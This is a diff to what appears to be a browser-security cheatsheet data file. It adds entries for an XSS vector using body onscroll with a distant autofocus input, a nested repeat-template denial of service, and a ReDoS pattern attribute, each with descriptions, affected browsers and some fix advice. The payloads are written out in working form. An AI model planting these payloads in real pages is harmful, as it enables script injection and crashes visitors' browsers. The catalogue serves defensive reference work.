@@ -114,7 +114,7 @@ var items =
         'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
         'reporter'   : 'gaz'
     },
-    { /* ID 8 - Self-executing blur event via neighboured */
+    { /* ID 8 - Self-executing blur event via autofocus competition */
         'id'         : 8, 
         'category'   : 'html5', 
         'name'       : 'Self-executing blur event via autofocus competition',
@@ -133,7 +133,7 @@ var items =
         'tags'       : ['xss', 'autofocus', 'blur', 'chrome', 'opera'],
         'reporter'   : '.mario'
     },
-    { /* ID 9 - Self-executing blur event via neighboured */
+    { /* ID 9 - Opera link-source JavaScript execution via CSS */
         'id'         : 9, 
         'category'   : 'css', 
         'name'       : 'Opera link-source JavaScript execution via CSS',
@@ -186,5 +186,56 @@ var items =
         },
         'tags'       : ['xss', 'svg', 'onload', 'opera', 'firefox', 'chrome'],
         'reporter'   : '.mario'
-    } 
+    },
+    { /* ID 12 - Self-executing JavaScript via <BODY> onscroll autofocus */
+        'id'         : 12,
+        'category'   : 'html5', 
+        'name'       : 'Self-executing JavaScript via <BODY> onscroll autofocus',
+        'data'       : '<body onscroll=%js_write%><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
+        'description': 'This vector triggers an onscroll event executing JavaScript on <BODY> due to an autofocus on an <INPUT> way further down the page.',
+        'tickets'    : [],
+        'howtofix'   : '',            
+        'browsers'   : {
+            'opera': [
+                '10.5'
+            ],
+            'chrome': [
+                '4.0', '5.0'
+            ]
+        },
+        'tags'       : ['xss', 'autofocus', 'scroll', 'chrome', 'opera'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 13 - Client-side denial of service via repeat templates */
+        'id'         : 13,
+        'category'   : 'dos', 
+        'name'       : 'Client-side denial of service via repeat templates',
+        'data'       : '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
+        'description': 'This vector uses the repeat template systax specifies in the WebForms 2.0 draft. By using nested tags repeating themselves allover again the client can be forced to deny service or even crash.',
+        'tickets'    : [],
+        'howtofix'   : 'Avoid allowing users submitting HTML containing repeat or repeat-start/-end attributes. If necessary validate the numerical values used for them to be reasonably small.',            
+        'browsers'   : {
+            'opera': [
+                '10.0'
+            ]
+        },
+        'tags'       : ['dos', 'repeat', 'template', 'webforms', 'opera'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 14 - Client-side denial of service via faulty regular expressions */
+        'id'         : 14,
+        'category'   : 'dos', 
+        'name'       : 'Client-side denial of service via faulty regular expressions',
+        'data'       : '<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
+        'description': 'Opera 10 allows client side validation via the pattern attribute. In case the pattern value is a badly written regex the client can be "dossed" with short customized character sequences.',
+        'tickets'    : [],
+        'howtofix'   : 'Don\'t allow users to submit HTML containing pattern attributes and make sure your own client side regular expressions used for validation are well written and not vulnerable against easy Redos attacks.',            
+        'browsers'   : {
+            'opera': [
+                '10.0'
+            ]
+        },
+        'tags'       : ['dos', 'pattern', 'regex', 'html5', 'validation', 'opera'],
+        'reporter'   : '.mario'
+    }
 ]
